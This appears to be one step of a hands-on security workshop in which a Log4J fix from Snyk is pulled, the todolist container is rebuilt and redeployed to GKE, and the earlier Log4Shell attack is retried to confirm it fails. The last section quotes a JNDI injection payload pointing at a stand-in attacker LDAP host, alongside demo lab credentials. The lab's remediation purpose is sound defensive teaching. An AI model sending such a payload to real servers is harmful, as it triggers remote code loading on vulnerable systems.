+++
title = "Step 9: Verify the Vulnerability is no longer exploitable."
chapter = false
weight = 44
+++

## Update your working copy

Back in your terminal, pull the latest changes, including the Snyk Fix, to the working environment.

```sh
git pull
```

## Re-build the Image
Now build and push the container to GAR (make sure you are cd'ed into the todolist directory).

```sh
docker build -t $REPO/todolist:latest .
docker push $REPO/todolist:latest
```

## Re-deploy the Application to GKE

After pushing the image to GAR, push it to GKE by scaling the goof deployment with kubectl. The deployment's ImagePullPolicy forces GKE to pull the latest image from GAR.

```sh
kubectl scale deployment todolist --replicas=0
kubectl scale deployment todolist --replicas=1
```

## Verify the Exploit no longer works

Refresh your broweser tab on the todolist app and log back in (user: foo@bar.org, password: foobar) and submit the same JDNI search string: `${jndi:ldap://ldap.darkweb:80/#Vandalize}`.
The page will not show the graphiti because the newer version on Log4J no longer is vulnerable!

![todolist-fixed](/images/todolist-fixed.png)